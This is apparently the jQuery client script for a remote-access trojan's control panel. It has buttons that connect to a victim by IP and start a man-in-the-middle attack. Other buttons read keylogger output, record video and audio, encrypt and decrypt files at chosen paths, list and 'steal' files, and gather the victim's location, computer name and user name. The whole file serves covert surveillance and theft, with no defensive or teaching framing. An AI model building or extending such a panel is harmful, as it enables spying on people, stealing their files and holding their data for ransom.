

//$("#reset").hide();
//Submit
$("#ConnectNewSubmit").click(function() {
  funcURL = "connect" ;
  ip = $("#ConnectNew").val();
  if (ip.length == 0) {
    ip = "";
  }
  
  $("#ConnectNewSubmit").addClass("pro").html("");

  //Replace with your server function
  var request = $.ajax({
    url: funcURL,
    method: "GET",
    data: { ip_address : ip },
    dataType : "text"
  });

  request.done(function( msg ) {
    setTimeout(function() { 
    $('#ConnectNewSubmit').addClass("finish");
    $('#ConnectNewResult').html(msg);

    setTimeout(function() { 
      $("#ConnectNewSubmit").removeClass("pro").removeClass("finish").html("Connect");
      //$('#ConnectNewResult').html("Click Submit To See Result:");
    }, 500);
    }, 1000);
    if(msg == "Connected successfully!") {
        var s = "/ovil/";
        window.open(
              s.concat(ip), "_blank");
    }
  });

  request.fail(function( jqXHR, textStatus, errorThrown ) {
    $('#ConnectNewSubmit').addClass("finish");
    $('#ConnectNewResult').html("Request failed: " + textStatus + " Error -  " + errorThrown + "</br> " + jqXHR.responseText);
    $("#ConnectNewSubmit").removeClass("pro").removeClass("finish").html("Connect");
  });

});
$("#ConnectOldSubmit").click(function() {
  funcURL = "connect" ;
  $("#ConnectOldSubmit").addClass("pro").html("");

  //Replace with your server function
  var request = $.ajax({
    url: funcURL,
    method: "GET"
  });

  request.done(function( msg ) {
    setTimeout(function() {
    $('#ConnectOldSubmit').addClass("finish");
    $('#ConnectOldResult').html(msg);

    setTimeout(function() {
      $("#ConnectOldSubmit").removeClass("pro").removeClass("finish").html("Connect");
      //$('#ConnectNewResult').html("Click Submit To See Result:");
    }, 500);
    }, 1000);
    if(msg == "Connected successfully!") {
        location.reload();
    }
  });

  request.fail(function( jqXHR, textStatus, errorThrown ) {
    $('#ConnectOldSubmit').addClass("finish");
    $('#ConnectOldResult').html("Request failed: " + textStatus + " Error -  " + errorThrown + "</br> " + jqXHR.responseText);
    $("#ConnectOldSubmit").removeClass("pro").removeClass("finish").html("Connect");
  });

});


$("#DisconnectSubmit").click(function() {
  funcURL = "disconnect" ;
  $("#DisconnectSubmit").addClass("pro").html("");

  //Replace with your server function
  var request = $.ajax({
    url: funcURL,
    method: "GET"
  });

  request.done(function( msg ) {
    setTimeout(function() {
    $('#DisconnectSubmit').addClass("finish");
    $('#DisconnectResult').html(msg);

    setTimeout(function() {
      $("#DisconnectSubmit").removeClass("pro").removeClass("finish").html("Disconnect");
      //$('#DisconnectResult').html("Click Submit To See Result:");
    }, 500);
    }, 1000);
    if(msg == "Disconnected successfully!") {
        location.reload();
    }
  });

  request.fail(function( jqXHR, textStatus, errorThrown ) {
    $('#DisconnectSubmit').addClass("finish");
    $('#DisconnectResult').html("Request failed: " + textStatus + " Error -  " + errorThrown + "</br> " + jqXHR.responseText);
    $("#DisconnectSubmit").removeClass("pro").removeClass("finish").html("Disconnect");
  });

});


$("#StaticMitmSubmit").click(function() {
  funcURL = "start" ;
  name = $("#StaticMitm").val();
  if (name.length == 0) {
    name = "";
  }

  $("#StaticMitmSubmit").addClass("pro").html("");

  //Replace with your server function
  var request = $.ajax({
    url: funcURL,
    method: "GET",
    data: { name : name },
    dataType : "text"
  });

  request.done(function( msg ) {
    setTimeout(function() {
    $('#StaticMitmSubmit').addClass("finish");
    $('#StaticMitmResult').html(msg);

    setTimeout(function() {
      $("#StaticMitmSubmit").removeClass("pro").removeClass("finish").html("Connect");
      //$('#StaticMitmResult').html("Click Submit To See Result:");
    }, 500);
    }, 1000);
  });

  request.fail(function( jqXHR, textStatus, errorThrown ) {
    $('#StaticMitmSubmit').addClass("finish");
    $('#StaticMitmResult').html("Request failed: " + textStatus + " Error -  " + errorThrown + "</br> " + jqXHR.responseText);
    $("#StaticMitmSubmit").removeClass("pro").removeClass("finish").html("Connect");
  });

});

$("#KeyLoggerSubmit").click(function() {
  funcURL = "stop" ;

  $("#KeyLoggerSubmit").addClass("pro").html("");

  //Replace with your server function
  var request = $.ajax({
    url: funcURL,
    method: "GET",
  });
    q = $('#KeyLoggerData').val()
  request.done(function( msg ) {
    setTimeout(function() {
    $('#KeyLoggerSubmit').addClass("finish");
//    $('#KeyLoggerResult').html(msg);

    setTimeout(function() {
      $("#KeyLoggerSubmit").removeClass("pro").removeClass("finish").html("Stop");
      $("#RefreshSubmit").html("Start");
      $('#KeyLoggerData').html("<center>" + msg + "</center>");
      //$('#KeyLoggerResult').html("Click Submit To See Result:");
    }, 500);
    }, 1000);
  });
});

$("#VideoAudioStartSubmit").click(function() {
  funcURL = "VideoAudioStart" ;

  $("#VideoAudioStartSubmit").addClass("pro").html("");

  //Replace with your server function
  var request = $.ajax({
    url: funcURL,
    method: "GET",
  });
  request.done(function( msg ) {
    setTimeout(function() {
    $('#VideoAudioStartSubmit').addClass("finish");
//    $('#VideoAudioStartResult').html(msg);

    setTimeout(function() {
      $("#VideoAudioStartSubmit").removeClass("pro").removeClass("finish").html("Start Recording");
      $('#VideoAudioResult').html("<center>" + msg + "</center>");
      //$('#VideoAudioStartResult').html("Click Submit To See Result:");
    }, 500);
    }, 1000);
    if (msg == "Started successfully!") {
        location.reload();
    }
  });

  request.fail(function( jqXHR, textStatus, errorThrown ) {
    $('#VideoAudioStartSubmit').addClass("finish");
    $('#VideoAudioResult').html("Request failed: " + textStatus + " Error -  " + errorThrown + "</br> " + jqXHR.responseText);
    $("#VideoAudioStartSubmit").removeClass("pro").removeClass("finish").html("Start");
  });

});


$("#VideoAudioStopSubmit").click(function() {
  funcURL = "VideoAudioStop" ;

  $("#VideoAudioStopSubmit").addClass("pro").html("");

  //Replace with your server function
  var request = $.ajax({
    url: funcURL,
    method: "GET",
  });
  request.done(function( msg ) {
    setTimeout(function() {
    $('#VideoAudioStopSubmit').addClass("finish");
//    $('#VideoAudioStopResult').html(msg);

    setTimeout(function() {
      $("#VideoAudioStopSubmit").removeClass("pro").removeClass("finish").html("Stop Recording");
      $('#VideoAudioResult').html("<center>" + msg + "</center>");
      //$('#VideoAudioStopResult').html("Click Submit To See Result:");
    }, 500);
    }, 1000);
  });

  request.fail(function( jqXHR, textStatus, errorThrown ) {
    $('#VideoAudioStopSubmit').addClass("finish");
    $('#VideoAudioResult').html("Request failed: " + textStatus + " Error -  " + errorThrown + "</br> " + jqXHR.responseText);
    $("#VideoAudioStopSubmit").removeClass("pro").removeClass("finish").html("Stop");
  });

});


$("#VideoStartSubmit").click(function() {
  funcURL = "VideoStart" ;

  $("#VideoStartSubmit").addClass("pro").html("");

  //Replace with your server function
  var request = $.ajax({
    url: funcURL,
    method: "GET",
  });
  request.done(function( msg ) {
    setTimeout(function() {
    $('#VideoStartSubmit').addClass("finish");
//    $('#VideoStartResult').html(msg);

    $("#VideoStartSubmit").removeClass("pro").removeClass("finish").html("Start Recording");
    $('#VideoResult').html("<center>" + msg + "</center>");
    }, 1000);
    if (msg.includes("success")) {
        location.reload();
    }
  });

  request.fail(function( jqXHR, textStatus, errorThrown ) {
    $('#VideoStartSubmit').addClass("finish");
    $('#VideoResult').html("Request failed: " + textStatus + " Error -  " + errorThrown + "</br> " + jqXHR.responseText);
    $("#VideoStartSubmit").removeClass("pro").removeClass("finish").html("Start");
  });

});


$("#VideoStopSubmit").click(function() {
  funcURL = "VideoStop" ;

  $("#VideoStopSubmit").addClass("pro").html("");

  //Replace with your server function
  var request = $.ajax({
    url: funcURL,
    method: "GET",
  });
  request.done(function( msg ) {
    setTimeout(function() {
    $('#VideoStopSubmit').addClass("finish");
//    $('#VideoStopResult').html(msg);

    setTimeout(function() {
      $("#VideoStopSubmit").removeClass("pro").removeClass("finish").html("Stop Recording");
      $('#VideoResult').html("<center>" + msg + "</center>");
      //$('#VideoStopResult').html("Click Submit To See Result:");
    }, 500);
    }, 1000);
  });

  request.fail(function( jqXHR, textStatus, errorThrown ) {
    $('#VideoStopSubmit').addClass("finish");
    $('#VideoResult').html("Request failed: " + textStatus + " Error -  " + errorThrown + "</br> " + jqXHR.responseText);
    $("#VideoStopSubmit").removeClass("pro").removeClass("finish").html("Stop");
  });

});


$("#AudioStartSubmit").click(function() {
  funcURL = "AudioStart" ;

  $("#AudioStartSubmit").addClass("pro").html("");

  //Replace with your server function
  var request = $.ajax({
    url: funcURL,
    method: "GET",
  });
  request.done(function( msg ) {
    setTimeout(function() {
    $('#AudioStartSubmit').addClass("finish");
//    $('#AudioStartResult').html(msg);

    $("#AudioStartSubmit").removeClass("pro").removeClass("finish").html("Start Recording");
    $('#AudioResult').html("<center>" + msg + "</center>");
    }, 1000);
    if (msg.includes("success")) {
        location.reload();
    }
  });

  request.fail(function( jqXHR, textStatus, errorThrown ) {
    $('#AudioStartSubmit').addClass("finish");
    $('#AudioResult').html("Request failed: " + textStatus + " Error -  " + errorThrown + "</br> " + jqXHR.responseText);
    $("#AudioStartSubmit").removeClass("pro").removeClass("finish").html("Start");
  });

});


$("#AudioStopSubmit").click(function() {
  funcURL = "AudioStop" ;

  $("#AudioStopSubmit").addClass("pro").html("");

  //Replace with your server function
  var request = $.ajax({
    url: funcURL,
    method: "GET",
  });
  request.done(function( msg ) {
    setTimeout(function() {
    $('#AudioStopSubmit').addClass("finish");
//    $('#AudioStopResult').html(msg);

    setTimeout(function() {
      $("#AudioStopSubmit").removeClass("pro").removeClass("finish").html("Stop Recording");
      $('#AudioResult').html("<center>" + msg + "</center>");
      //$('#AudioStopResult').html("Click Submit To See Result:");
    }, 500);
    }, 1000);
  });

  request.fail(function( jqXHR, textStatus, errorThrown ) {
    $('#AudioStopSubmit').addClass("finish");
    $('#AudioResult').html("Request failed: " + textStatus + " Error -  " + errorThrown + "</br> " + jqXHR.responseText);
    $("#AudioStopSubmit").removeClass("pro").removeClass("finish").html("Stop");
  });

});


$("#EncryptSubmit").click(function() {
  funcURL = "encrypt" ;
  key = $("#EncryptKey").val();
  if (key.length == 0) {
    key = "default";
  }
  path = $("#EncryptPath").val();
  if (path.length == 0) {
    path = "";
  }

  $("#EncryptSubmit").addClass("pro").html("");

  //Replace with your server function
  var request = $.ajax({
    url: funcURL,
    method: "GET",
    data: { key : key , path : path},
    dataType : "text"
  });

  request.done(function( msg ) {
    setTimeout(function() {
    $('#EncryptSubmit').addClass("finish");
    $('#EncryptResult').html(msg);

    setTimeout(function() {
      $("#EncryptSubmit").removeClass("pro").removeClass("finish").html("Encrypt");
      //$('#EncryptResult').html("Click Submit To See Result:");
    }, 500);
    }, 1000);


  });

  request.fail(function( jqXHR, textStatus, errorThrown ) {
    $('#EncryptSubmit').addClass("finish");
    $('#EncryptResult').html("Request failed: " + textStatus + " Error -  " + errorThrown + "</br> " + jqXHR.responseText);
    $("#EncryptSubmit").removeClass("pro").removeClass("finish").html("Encrypt");
  });

});


$("#DecryptSubmit").click(function() {
  funcURL = "decrypt" ;
  key = $("#DecryptKey").val();
  if (key.length == 0) {
    key = "default";
  }
  path = $("#DecryptPath").val();
  if (path.length == 0) {
    path = "";
  }

  $("#DecryptSubmit").addClass("pro").html("");

  //Replace with your server function
  var request = $.ajax({
    url: funcURL,
    method: "GET",
    data: { key : key , path : path},
    dataType : "text"
  });

  request.done(function( msg ) {
    setTimeout(function() {
    $('#DecryptSubmit').addClass("finish");
    $('#DecryptResult').html(msg);

    setTimeout(function() {
      $("#DecryptSubmit").removeClass("pro").removeClass("finish").html("Decrypt");
      //$('#DecryptResult').html("Click Submit To See Result:");
    }, 500);
    }, 1000);
    $("#DecryptPath")[0].reset();
    $("#Decryptkey")[0].reset();


  });

  request.fail(function( jqXHR, textStatus, errorThrown ) {
    $('#DecryptSubmit').addClass("finish");
    $('#DecryptResult').html("Request failed: " + textStatus + " Error -  " + errorThrown + "</br> " + jqXHR.responseText);
    $("#DecryptSubmit").removeClass("pro").removeClass("finish").html("Decrypt");
  });

});


$("#ShowFilesSubmit").click(function() {
  funcURL = "files" ;
  path = $("#ShowFilesPath").val();
  if (path.length == 0) {
    path = "";
  }

  $("#ShowFilesSubmit").addClass("pro").html("");

  //Replace with your server function
  var request = $.ajax({
    url: funcURL,
    method: "GET",
    data: { path : path },
    dataType : "text"
  });

  request.done(function( msg ) {
    setTimeout(function() {
    $('#ShowFilesSubmit').addClass("finish");
    $('#ShowFilesResult').html(msg);

    setTimeout(function() {
      $("#ShowFilesSubmit").removeClass("pro").removeClass("finish").html("Show Files");
      //$('#ShowFilesResult').html("Click Submit To See Result:");
    }, 500);
    }, 1000);


  });


  request.fail(function( jqXHR, textStatus, errorThrown ) {
    $('#ShowFilesSubmit').addClass("finish");
    $('#ShowFilesResult').html("Request failed: " + textStatus + " Error -  " + errorThrown + "</br> " + jqXHR.responseText);
    $("#ShowFilesSubmit").removeClass("pro").removeClass("finish").html("Show Files");
  });

});


$("#StealFileSubmit").click(function() {
  funcURL = "steal" ;
  path = $("#StealFilePath").val();
  if (path.length == 0) {
    path = "";
  }

  $("#StealFileSubmit").addClass("pro").html("");

  //Replace with your server function
  var request = $.ajax({
    url: funcURL,
    method: "GET",
    data: { path : path },
    dataType : "text"
  });

  request.done(function( msg ) {
    setTimeout(function() {
    $('#StealFileSubmit').addClass("finish");
    $('#StealFileResult').html(msg);

    setTimeout(function() {
      $("#StealFileSubmit").removeClass("pro").removeClass("finish").html("Steal File");
      //$('#StealFileResult').html("Click Submit To See Result:");
    }, 500);
    }, 1000);


  });


  request.fail(function( jqXHR, textStatus, errorThrown ) {
    $('#StealFileSubmit').addClass("finish");
    $('#StealFileResult').html("Request failed: " + textStatus + " Error -  " + errorThrown + "</br> " + jqXHR.responseText);
    $("#StealFileSubmit").removeClass("pro").removeClass("finish").html("Steal File");
  });

});

$("#FindLocationSubmit").click(function() {
  funcURL = "FindLocation" ;

  $("#FindLocationSubmit").addClass("pro").html("");

  //Replace with your server function
  var request = $.ajax({
    url: funcURL,
    method: "GET",
  });

  request.done(function( msg ) {
    setTimeout(function() {
    $('#FindLocationSubmit').addClass("finish");
    $('#OtherInfoResults').html(msg);

    setTimeout(function() {
      $("#FindLocationSubmit").removeClass("pro").removeClass("finish").html("Find Location");
      //$('#OtherInfoResults').html("Click Submit To See Result:");
    }, 500);
    }, 1000);


  });


  request.fail(function( jqXHR, textStatus, errorThrown ) {
    $('#FindLocationSubmit').addClass("finish");
    $('#OtherInfoResults').html("Request failed: " + textStatus + " Error -  " + errorThrown + "</br> " + jqXHR.responseText);
    $("#FindLocationSubmit").removeClass("pro").removeClass("finish").html("Find Location");
  });

});

$("#GetComputerSubmit").click(function() {
  funcURL = "GetComputer" ;

  $("#GetComputerSubmit").addClass("pro").html("");

  //Replace with your server function
  var request = $.ajax({
    url: funcURL,
    method: "GET",
  });

  request.done(function( msg ) {
    setTimeout(function() {
    $('#GetComputerSubmit').addClass("finish");
    $('#OtherInfoResults').html(msg);

    setTimeout(function() {
      $("#GetComputerSubmit").removeClass("pro").removeClass("finish").html("Computer Name");
      //$('#OtherInfoResults').html("Click Submit To See Result:");
    }, 500);
    }, 1000);


  });


  request.fail(function( jqXHR, textStatus, errorThrown ) {
    $('#GetComputerSubmit').addClass("finish");
    $('#OtherInfoResults').html("Request failed: " + textStatus + " Error -  " + errorThrown + "</br> " + jqXHR.responseText);
    $("#GetComputerSubmit").removeClass("pro").removeClass("finish").html("Computer Name");
  });

});


$("#GetUserSubmit").click(function() {
  funcURL = "GetUser" ;

  $("#GetUserSubmit").addClass("pro").html("");

  //Replace with your server function
  var request = $.ajax({
    url: funcURL,
    method: "GET",
  });

  request.done(function( msg ) {
    setTimeout(function() {
    $('#GetUserSubmit').addClass("finish");
    $('#OtherInfoResults').html(msg);

    setTimeout(function() {
      $("#GetUserSubmit").removeClass("pro").removeClass("finish").html("Get User Name");
      //$('#OtherInfoResults').html("Click Submit To See Result:");
    }, 500);
    }, 1000);


  });


  request.fail(function( jqXHR, textStatus, errorThrown ) {
    $('#GetUserSubmit').addClass("finish");
    $('#OtherInfoResults').html("Request failed: " + textStatus + " Error -  " + errorThrown + "</br> " + jqXHR.responseText);
    $("#GetUserSubmit").removeClass("pro").removeClass("finish").html("Get User Name");
  });

});

